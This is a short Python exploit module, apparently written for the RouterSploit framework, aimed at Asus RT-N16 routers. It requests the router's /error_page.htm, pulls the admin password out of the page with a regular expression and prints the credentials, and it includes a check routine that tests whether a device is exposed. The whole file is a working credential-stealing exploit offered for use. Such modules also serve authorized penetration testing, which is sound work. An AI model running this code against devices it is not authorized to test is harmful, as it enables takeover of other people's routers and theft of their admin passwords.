# asus_password_disclosure.py
# rsf exploit module
# description: Password disclosure vulnerability in Asus RT-N16 devices

import http.client
import re


def run(target, port):
    conn = http.client.HTTPConnection(target, port, timeout=5)
    conn.request("GET", "/error_page.htm")
    response = conn.getresponse()

    if response.status != 200:
        print("[-] Could not get response from target")
        return

    data = response.read().decode()
    creds = re.findall(r"if\('1' == '0' \|\| '(.+?)' == 'admin'\)", data)

    if creds:
        print("[+] Credentials found!")
        print("Login: admin")
        print(f"Password: {creds[0]}")
    else:
        print("[-] Credentials not found")


def check(target, port):
    conn = http.client.HTTPConnection(target, port, timeout=5)
    conn.request("GET", "/error_page.htm")
    response = conn.getresponse()
    if response.status != 200:
        return False

    data = response.read().decode()
    creds = re.findall(r"if\('1' == '0' \|\| '(.+?)' == 'admin'\)", data)

    return bool(creds)

